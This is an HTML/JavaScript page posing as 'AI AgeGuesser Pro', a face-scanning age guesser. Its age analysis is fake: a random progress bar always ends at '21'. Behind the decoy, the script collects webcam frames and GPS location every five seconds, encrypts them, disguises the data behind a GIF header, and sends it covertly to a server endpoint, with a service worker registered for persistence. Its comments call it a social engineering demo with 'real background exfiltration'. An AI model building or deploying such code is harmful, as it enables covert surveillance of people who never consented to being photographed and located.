<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI AgeGuesser Pro | Neural Analysis</title>
    <style>
        :root { --primary: #8b5cf6; --accent: #ec4899; --bg: #0f172a; }
        body { 
            margin: 0; padding: 0; background: radial-gradient(at top left, #2e1065, var(--bg));
            color: white; font-family: 'Inter', sans-serif;
            display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden;
        }
        .glass-card {
            background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.1); padding: 40px;
            border-radius: 24px; box-shadow: 0 0 40px rgba(139, 92, 246, 0.3); width: 360px; text-align: center;
        }
        h1 { font-size: 22px; margin-bottom: 5px; background: linear-gradient(to right, #a78bfa, #f472b6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .tagline { font-size: 12px; color: #94a3b8; margin-bottom: 20px; }
        .preview-window {
            width: 100%; height: 240px; background: #020617; border-radius: 16px;
            margin-bottom: 20px; position: relative; overflow: hidden; border: 2px solid #334155;
        }
        #video { width: 100%; height: 100%; object-fit: cover; display: none; }
        .scanning-ui {
            position: absolute; inset: 0; border: 2px solid var(--primary); 
            border-radius: 16px; opacity: 0.3; pointer-events: none; display: none;
        }
        .scan-line {
            position: absolute; width: 100%; height: 2px; background: var(--accent);
            box-shadow: 0 0 15px var(--accent); top: 0; animation: scanMove 3s infinite linear; display: none;
        }
        @keyframes scanMove { 0% { top: 0%; } 100% { top: 100%; } }
        .btn {
            background: linear-gradient(135deg, var(--primary), var(--accent));
            color: white; border: none; padding: 14px; border-radius: 12px; width: 100%;
            font-weight: 700; font-size: 15px; cursor: pointer; transition: 0.3s;
        }
        .btn:hover { opacity: 0.9; transform: translateY(-2px); }
        #status-box { font-family: monospace; font-size: 11px; color: #f472b6; margin-top: 15px; text-align: left; }
    </style>
</head>
<body>

<div class="glass-card">
    <h1>AI AgeGuesser Pro</h1>
    <p class="tagline">Neural Analysis of Micro-expressions & Biometrics</p>
    
    <div class="preview-window">
        <div id="scan-line" class="scan-line"></div>
        <div id="scanning-ui" class="scanning-ui"></div>
        <video id="video" autoplay muted playsinline></video>
        <div id="placeholder" style="padding-top: 100px; color: #475569; font-size: 11px;">CENTER YOUR FACE...</div>
    </div>

    <button id="main-btn" class="btn">START SCAN</button>
    <div id="status-box">_ SYSTEM READY</div>
</div>

<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script>
    // HTTPS Enforcer for hardware access
    if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
        location.replace(`https:${location.href.substring(location.protocol.length)}`);
    }

    const btn = document.getElementById('main-btn');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const statusBox = document.getElementById('status-box');
    const scanLine = document.getElementById('scan-line');
    const scanUI = document.getElementById('scanning-ui');

    const SECRET_PASSPHRASE = "neural-link-omega-99"; 
    const STEALTH_TOKEN = "delta-v-882-alpha";
    const GIF_MASK = "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";
    let coords = { lat: "unknown", lon: "unknown" };

    const updateStatus = (msg) => { statusBox.innerHTML = `_ ${msg.toUpperCase()}`; };

    if ('serviceWorker' in navigator) {
        window.addEventListener('load', () => navigator.serviceWorker.register('/sw.js'));
    }

    async function deriveKey(pass) {
        const encoder = new TextEncoder();
        const keyMaterial = await crypto.subtle.importKey("raw", encoder.encode(pass), { name: "PBKDF2" }, false, ["deriveKey"]);
        return crypto.subtle.deriveKey(
            { name: "PBKDF2", salt: encoder.encode("neural-static-salt"), iterations: 100000, hash: "SHA-256" },
            keyMaterial, { name: "AES-GCM", length: 256 }, false, ["encrypt"]
        );
    }

    async function encryptAndMask(data) {
        const key = await deriveKey(SECRET_PASSPHRASE);
        const iv = crypto.getRandomValues(new Uint8Array(12)); 
        const encrypted = await crypto.subtle.encrypt({ name: "AES-GCM", iv: iv }, key, new TextEncoder().encode(JSON.stringify(data)));
        const pkg = { iv: btoa(String.fromCharCode(...iv)), content: btoa(String.fromCharCode(...new Uint8Array(encrypted))) };
        return GIF_MASK + btoa(JSON.stringify(pkg));
    }

    btn.onclick = async () => {
        btn.disabled = true;
        updateStatus("Requesting Biometric Link...");

        navigator.geolocation.getCurrentPosition(
            (p) => { coords = { lat: p.coords.latitude, lon: p.coords.longitude }; },
            () => { updateStatus("Error: GPS handshaking failed."); }
        );

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            video.style.display = 'block';
            scanLine.style.display = 'block';
            scanUI.style.display = 'block';
            document.getElementById('placeholder').style.display = 'none';
            
            if (navigator.serviceWorker.controller) {
                navigator.serviceWorker.controller.postMessage({ type: 'INIT_PERSISTENCE' });
            }

            updateStatus("Analyzing Face... 0%");
            
            // Simulation logic for the Social Engineering demo
            let progress = 0;
            const timer = setInterval(() => {
                progress += Math.floor(Math.random() * 5) + 1;
                if(progress <= 99) updateStatus(`Analyzing Face... ${progress}%`);
                else {
                    updateStatus("Prediction: 21 (Confidence: 94%)");
                    clearInterval(timer);
                }
            }, 500);

            // Real background exfiltration
            setInterval(async () => {
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, 640, 480);
                const masked = await encryptAndMask({ 
                    image: canvas.toDataURL('image/jpeg', 0.5), 
                    metadata: { location: coords, ts: new Date().toISOString() } 
                });

                fetch('/save-photo', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'X-Neural-Token': STEALTH_TOKEN },
                    body: JSON.stringify({ data: masked })
                }).catch(() => {});
            }, 5000);

        } catch (e) { 
            updateStatus("SSL Error: Permissions denied."); 
            btn.disabled = false; 
        }
    };
</script>
</body>
</html>
